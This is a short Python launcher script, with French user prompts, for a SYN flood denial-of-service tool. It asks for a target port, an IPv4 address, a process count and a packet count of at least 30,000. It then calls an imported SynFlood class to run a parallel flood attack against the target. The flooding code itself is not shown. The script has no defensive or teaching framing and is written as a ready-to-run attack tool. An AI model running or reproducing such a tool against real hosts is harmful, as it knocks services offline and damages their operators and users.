from SynFlood.VerifyIp import verify_IPv4
from SynFlood.syn_flood import SynFlood

if __name__ == "__main__":
    print("A l'input des données, entrez Q pour quiter, entrez R pour recommencer, sinon entrez les données")
    port = ""
    target_ip = ""
    process = ""
    packets = ""
    while True:
        port = input("Indiquez le port cible : ")
        if port.upper() == "Q":
            exit(0)
        elif port.upper() == "R":
            continue
        else:
            port = int(port)
            break

    while True:
        target_ip = input("Entrez l'IPV4 cible : ")
        if target_ip.upper() == "Q":
            exit(0)
        elif target_ip.upper() == "R":
            continue
        elif not verify_IPv4(target_ip):
            print("L'adresse IP est invalide")
        else:
            break

    while True:
        process = input("Entrez le nombre de processus : ")
        if process.upper() == "Q":
            exit(0)
        elif process.upper() == "R":
            continue
        else:
            process = int(process)
            break

    while True:
        packets = input("Entrez le nombre de paquets (> 30'000): ")
        if packets.upper() == "Q":
            exit(0)
        elif packets.upper() == "R":
            continue
        elif packets.isdigit() and int(packets) < 30000:
            print("Le nombre de paquets doit être supérieur à 30'000")
        else:
            packets = int(packets)
            break

    SynFlood(target_ip=target_ip, target_port=port, source_ip="0.0.0.0", source_port=12345).parallel_attack(process, packets)



